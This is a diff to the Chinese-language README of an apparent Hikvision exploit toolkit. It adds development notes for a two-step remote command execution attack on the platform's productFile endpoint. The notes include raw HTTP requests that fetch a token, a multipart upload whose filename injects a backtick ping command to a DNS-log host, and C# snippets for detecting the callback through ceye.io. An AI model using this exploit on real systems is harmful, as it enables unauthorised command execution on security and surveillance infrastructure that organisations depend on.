@@ -167,6 +167,7 @@ Hikvision综合漏洞利用工具 v2.0版
 增加了Hikvision综合安防管理平台licenseExpire远程命令执行漏洞
 
 增加了Hikvision综合安防管理平台installation远程命令执行漏洞
+
 licenseExpire自定义模块可用
 
 installation自定义模块可用
@@ -192,7 +193,89 @@ Hikvision综合漏洞利用工具 v1.7版
 
 感谢ling1uan提到的report请求构造体问题，已修复
 
+# 更新小记
 
+编写Hikvision综合安防管理平台productFile远程命令执行漏洞这个漏洞
+是需要两步进行
+很容易踩坑的点，访问try异常，数据处理失败
+循环外判断，错误
+第一个POC
+
+GET /iac/iasService/v1/register HTTP/1.1
+Host: 
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
+Accept: 
+
+这个是获取token
+理论上来讲，如果没有获取到token，漏洞可能不存在，那么获取到再读到的token进行两次判断
+这样才能更好的检测漏洞
+
+那么获取的token应该这样表示：
+ string token = response.Headers["Token"];
+ 取token的Headers头
+ 因为这个页面默认是403，所以需要在403做判断，而不是直接状态的判断
+ 如：if (errorResponse.StatusCode == HttpStatusCode.Forbidden)
+ 不在异常处判断，是很容易踩坑的
+ 正确做法是在try异常处判断
+ 加入  catch (WebException ex)
+这样去判断，先拿到token信息
+接着，调用一个自定义函数方法
+引用到第二个POC去判断
+
+POST /svm/api/v1/productFile?type=product&ip=127.0.0.1&agentNo=1 HTTP/1.1
+Host: 
+Token: SElLIElnVTBzNVd6eWlibVB4M046dUE0SlBBbGJTWGNMUnk5aWg4dkJXL2RjeEdqKys4aTd0cHBMM09INytVZz0=
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data;boundary =---------------------------142851345723692939351758052805
+Content-Length: 346
+
+-----------------------------142851345723692939351758052805
+Content-Disposition: form-data; name="file"; filename="`ping xxx.dnslog.cn`.zip"
+Content-Type: application/zip
+
+123
+-----------------------------142851345723692939351758052805--
+这里的话，重点是
+"`ping xxx.dnslog.cn`.zip"
+我们可以用本地的压缩包，要特别注意写法
+那么本地就准备一个zip
+`输入你的dns`.zip
+如sdadsad.dnslog.cn
+
+![image](https://github.com/MInggongK/Hikvision-/blob/main/ghf.png)
+然后这样要做精准判断的话
+就是读取自定义的dns信息，随机叠加+自定义信息
+正确写法：
+  Random random = new Random();
+  int randomNumber = random.Next(1, 100);
+  string filePath = "`自定义信息`.zip"; 读取本地zip
+   String filepath1 = randomNumber + "." + filePath; 叠加
+     String filepath1 = randomNumber + "." + filePath;  叠加后的数据
+   filepath1 = textBox5.Text; 传给一个控件
+  request.Headers.Add("Token", token);加载读到的token
+  验证的话， 还是采用http://api.ceye.io/v1/records?token=去验证
+   http://api.ceye.io/v1/records?token=+"token信息";
+   采用了自定义dnslog
+   本地的file,默认是：``.zip
+   要和本地的对应，否则会报错
+   那么用户输入xxx.dnslog.cn,叠加`xxx.dnslog.cn`.zip
+   正确写法："`" + textBox15.Text + "`" + ".zip";
+   token是二次验证的
+   代码其实如果没过
+     if (statusCode == HttpStatusCode.OK)
+  {
+      if (a.Contains("0"))
+      {
+      这里就可以直接判断
+      代码如果过了
+      二次验证
+      调用"http://api.ceye.io/v1/records?token=
+      查找是否存在随机的dnslog信息
+   
+      
 
 
 
